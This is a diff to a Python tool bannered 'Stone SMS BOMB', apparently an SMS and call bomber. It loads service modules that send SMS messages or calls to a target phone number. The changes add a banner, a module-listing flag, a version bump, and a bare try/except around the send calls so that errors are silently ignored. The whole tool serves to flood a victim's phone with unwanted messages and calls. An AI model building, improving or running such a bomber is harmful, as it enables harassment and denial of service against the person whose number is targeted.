@@ -3,7 +3,7 @@
 #   by 100LAR
 #
 
-ver = "0.1.2"
+ver = "0.1.3"
 
 import inspect
 import logging
@@ -20,22 +20,38 @@ if not os.path.exists("settings.txt"):
     config.add_section("Settings")
     config.set("Settings", "call", "False")
     config.set("Settings", "service-path", "services")
+    config.set("Settings", "list-importing", "False")
     with open("settings.txt", "w") as config_file:
         config.write(config_file)
 
 config = configparser.ConfigParser()
 config.read("settings.txt")
 send_calls = config.get("Settings", "call")
+send_calls_bool = True if send_calls == "true" or send_calls == "True" else False
+
 service_path = config.get("Settings", "service-path")
+list_importing = config.get("Settings", "list-importing")
+list_importing_bool = True if list_importing == "true" or list_importing == "True" else False
 
 services = os.listdir(service_path)
 service_classes = {}
 sys.path.insert(0, service_path)
 
+print("""
+   _____ _                      _____ __  __  _____   ____   ____  __  __ ____  
+  / ____| |                    / ____|  \/  |/ ____| |  _ \ / __ \|  \/  |  _ \ 
+ | (___ | |_ ___  _ __   ___  | (___ | \  / | (___   | |_) | |  | | \  / | |_) |
+  \___ \| __/ _ \| '_ \ / _ \  \___ \| |\/| |\___ \  |  _ <| |  | | |\/| |  _ < 
+  ____) | || (_) | | | |  __/  ____) | |  | |____) | | |_) | |__| | |  | | |_) |
+ |_____/ \__\___/|_| |_|\___| |_____/|_|  |_|_____/  |____/ \____/|_|  |_|____/ """)
+print("\nVersion : "+ver+"\n")
+
 def import_services():
     for service in services:
         if service.endswith('.py') and service != 'service.py':
             module = __import__(service[:-3])
+            if list_importing_bool:
+                print(str(module))
             for member in inspect.getmembers(module, inspect.isclass):
                 if member[1].__module__ == module.__name__:
                     service_classes[module] = member[0]
@@ -43,11 +59,15 @@ def import_services():
         
 
 def run_service(service_class, module_, phone, country_code, phone_code, sms_text, type_):
-    if type_ == 'call':
-        getattr(module_, service_class)(phone, [country_code, phone_code], sms_text).send_call()
-    else:
-        getattr(module_, service_class)(phone, [country_code, phone_code], sms_text).send_sms()
-    sys.exit()
+    try:
+        if type_ == 'call':
+            getattr(module_, service_class)(phone, [country_code, phone_code], sms_text).send_call()
+        else:
+            getattr(module_, service_class)(phone, [country_code, phone_code], sms_text).send_sms()
+        sys.exit()
+    except:
+        pass
+        
 
 def start_bomb():
     send_calls_bool = True if send_calls == 'true' or send_calls == 'True' else False
